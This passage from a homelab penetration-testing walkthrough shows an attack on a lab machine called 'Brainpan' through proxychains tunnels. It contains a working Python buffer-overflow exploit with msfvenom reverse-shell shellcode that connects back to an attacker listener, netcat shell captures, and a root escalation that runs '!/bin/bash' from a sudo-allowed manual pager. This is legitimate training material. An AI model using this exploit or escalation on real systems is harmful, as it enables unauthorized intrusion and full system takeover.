b"\x38\x60\x9b\x93\xe4\xe1\x26\xfe\x16\xdc\x65\x07\x95\xd4"
b"\x15\xfc\x85\x9d\x10\xb8\x01\x4e\x69\xd1\xe7\x70\xde\xd2"
b"\x2d")

payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.59.5", 9999)) # Host and port
s.send(payload)
s.close()
```

Remember to change the IP and port.
Now we need to move this exploit to the `Matrix` machine and execute it there. If everything goes well, we should gain a reverse shell on our attacker machine. Although, this is not neccessary, because if we notice, we can reach the port **9999** of the `Brainpan` machine:

```zsh
❯ proxychains nc 192.168.59.5 9999
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:9999 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:8888 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  192.168.59.5:9999  ...  OK
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```

So the only thing that changes, is that we need to execute this script of python with `proxychains`:

```zsh
❯ proxychains python3 bof.py
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:9999 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:8888 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  192.168.59.5:9999  ...  OK
```

```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.0.111] from (UNKNOWN) [192.168.0.114] 44716
CMD Version 1.4.1

Z:\home\puck>
```

YEAHHH!!!! We've been able to make that the shell created by the `BoF` to travel on all these tunnels!!!

## Privilege escalation
---

Ok, so we are as `puck` on this machine, but we want to get as root! So with `msfvemon` (again) we are going to modify the exploit:

```zsh
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.59.4 LPORT=7070 -f py -b "\x00" EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 479 bytes
buf =  b""
buf += b"\xbe\xa4\x99\x90\x1d\xda\xcb\xd9\x74\x24\xf4\x5f"
buf += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x77\x0e\x03\xd3"
buf += b"\x97\x72\xe8\x2a\x73\x85\xf0\x1f\xc0\x39\x9d\x9d"
buf += b"\x4f\x5c\xd1\xc7\x82\x1f\x81\x5e\xad\x1f\x6b\xe0"
buf += b"\x84\x26\x8a\x88\xd6\x71\x57\x4c\xbf\x83\xa8\x57"
buf += b"\xa1\x0d\x49\xd7\xbb\x5d\xdb\x44\xf7\x5d\x52\x8b"
buf += b"\x3a\xe1\x36\x23\xab\xcd\xc5\xdb\x5b\x3d\x05\x79"
buf += b"\xf5\xc8\xba\x2f\x56\x42\xdd\x7f\x53\x99\x9e"
```

This is how my exploit looks like:

```python
#!/usr/bin/python3
# By ruycr4ft

import socket
from struct import pack

offset = 524 # Number of junk bytes (adjust it to your target binary)
before_eip = b"A" * offset # This is the junk you input until you start modifying EIP
eip = pack("<I", 0x311712f3) # jmp ESP

shellcode =  b""
shellcode += b"\xbe\xa4\x99\x90\x1d\xda\xcb\xd9\x74\x24\xf4\x5f"
shellcode += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x77\x0e\x03\xd3"
shellcode += b"\x97\x72\xe8\x2a\x73\x85\xf0\x1f\xc0\x39\x9d\x9d"
shellcode += b"\x4f\x5c\xd1\xc7\x82\x1f\x81\x5e\xad\x1f\x6b\xe0"
shellcode += b"\x84\x26\x8a\x88\xd6\x71\x57\x4c\xbf\x83\xa8\x57"
shellcode += b"\xa1\x0d\x49\xd7\xbb\x5d\xdb\x44\xf7\x5d\x52\x8b"
shellcode += b"\x3a\xe1\x36\x23\xab\xcd\xc5\xdb\x5b\x3d\x05\x79"
shellcode += b"\xf5\xc8\xba\x2f\x56\x42\xdd\x7f\x53\x99\x9e"

payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.59.5", 9999)) # Host and port
s.send(payload)
s.close()
```

Now is the same procedure, execute the exploit with `proxychains`:

```zsh
❯ proxychains python3 bof.py
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:9999 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:8888 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:7777  ...  192.168.59.5:9999  ...  OK
```

Check your `netcat` listener:

```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.0.111] from (UNKNOWN) [192.168.0.114] 44718
whoami
puck
```

Nice!!!!

>**Note:** You may need to restart the whole tunnel, it usually crashes on the windows machine.

If we check our privileges, we can see that we can execute a binary as root:

```zsh
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
puck@brainpan:/home/puck$ 
```

We can see that a command is `manual`, so this is pretty easy. If we execute the manual for example, of `whoami`, we enter a mode called `paginate`, in which we an enter `!/bin/bash` and because this binary is being executed as root, we get a bash as root:

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansudo /home/anansi/bin/anansi_util manual whoami
sudo /home/anansi/bin/anansi_util manual whoami
No manual entry for manual
root@brainpan:/usr/share/man# whoami
root
root@brainpan:/usr/share/man#
```

GREAAT!!!! We've rooted the whole homelab of the `eCPPTv2`!!

# Conclusions
---

This is a pretty easy certification, the only thing that can make things hard is all the tunnels, so you must **be organized**. As you can see, any of these vulnerabilities are complex to exploit. As I said, the difficulty is the tunnelling. 